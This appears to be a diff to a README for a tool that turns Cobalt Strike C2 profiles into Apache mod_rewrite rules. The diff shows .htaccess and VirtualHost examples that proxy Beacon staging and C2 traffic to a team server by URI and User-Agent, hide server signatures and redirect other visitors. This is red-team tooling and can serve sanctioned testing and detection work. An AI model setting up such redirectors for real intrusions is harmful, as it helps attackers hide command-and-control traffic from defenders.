@@ -24,45 +24,58 @@ The havex.profile example is included for a quick test.
 3) Modify as needed
 4) Reload\restart the web server
 
-## Apache mod_rewrite Example Usage
+## Apache mod_rewrite Example Usage using a remote include file
 
 ```
-python3 cs2modrewrite.py -i havex.profile -c https://TEAMSERVER -r https://GOHERE > /var/www/html/.htaccess
-#### Save the following as .htaccess in the root web directory (i.e. /var/www/html/.htaccess)
-
-########################################
-## .htaccess START 
-RewriteEngine On
-## Uncomment to enable verbose debugging in /var/logs/apache2/error.log
-# LogLevel alert rewrite:trace5
-## (Optional)
-## Scripted Web Delivery 
-## Uncomment and adjust as needed
-#RewriteCond %{REQUEST_URI} ^/css/style1.css?$
-#RewriteCond %{HTTP_USER_AGENT} ^$
-#RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
-
-## Default Beacon Staging Support (/1234)
-RewriteCond %{REQUEST_URI} ^/..../?$
-RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
-RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
-
-## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
-## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver
-## Consider adding other HTTP checks to fine tune the check.  (HTTP Cookie, HTTP Referer, HTTP Query String, etc)
-## Refer to http://httpd.apache.org/docs/current/mod/mod_rewrite.html
-## Profile URIs
-RewriteCond %{REQUEST_URI} ^(/include/template/isx.php.*|/wp06/wp-includes/po.php.*|/wp08/wp-includes/dtcla.php.*|/modules/mod_search.php.*|/blog/wp-includes/pomo/src.php.*|/includes/phpmailer/class.pop3.php.*|/api/516280565958.*|/api/516280565959.*)$
-## Profile UserAgent
-RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
-RewriteRule ^.*$ "https://TEAMSERVER%{REQUEST_URI}" [P,L]
-
-## Redirect all other traffic here (Optional)
-RewriteRule ^.*$ HTTPS://GOHERE/ [L,R=302]
-
-## .htaccess END
-########################################
+python3 cs2modrewrite.py -i havex.profile -c https://TEAMSERVER -r https://GOHERE -o /etc/apache2/redirect.rules
 ```
+
+Example Apache Config
+
+```
+<VirtualHost *:80>
+    ServerAdmin webmaster@localhost
+    DocumentRoot /var/www/html
+    RemoteIPHeader X-Forwarded-For
+
+    ErrorLog /var/log/apache2/redirector_error.log
+    CustomLog /var/log/apache2/redirector_access.log combined
+    ErrorDocument 401 " "
+    ErrorDocument 403 " "
+    ErrorDocument 404 " "
+    ErrorDocument 500 " "
+    ErrorDocument 503 " "
+
+    # Include redirect.rules
+    Include /etc/apache2/redirect.rules
+</VirtualHost>
+```
+
+Consider Updating Apache Server Header, ServerTokens, and logging with something like the following.
+
+```
+## Update Apached Server Header, ServerTokens, and logging
+echo "Update Update Apached Server Header, ServerTokens, and logging"
+sed -i -e 's/\(ServerTokens\s\+\)OS/\1Prod/g' /etc/apache2/conf-enabled/security.conf
+sed -i -e 's/\(ServerSignature\s\+\)On/\1Off/g' /etc/apache2/conf-enabled/security.conf
+echo "SecServerSignature Server" >> /etc/apache2/conf-enabled/security.conf
+echo "LogLevel alert rewrite:trace2" >> /etc/apache2/conf-enabled/security.conf
+
+## Update Apached remoteip.conf
+echo "Update Apached remoteip.conf"
+echo "RemoteIPHeader X-Forwarded-For" >> /etc/apache2/conf-enabled/remoteip.conf
+
+## Restart apache server
+echo "Restart apache server"
+systemctl restart apache2
+```
+
+## Apache mod_rewrite Example Usage using a .htaccess file
+
+```
+python3 cs2modrewrite.py -i havex.profile -c https://TEAMSERVER -r https://GOHERE -o /var/www/html/.htaccess
+```
+
 ## Apache Rewrite Setup and Tips
 
 ### Enable Rewrite and Proxy
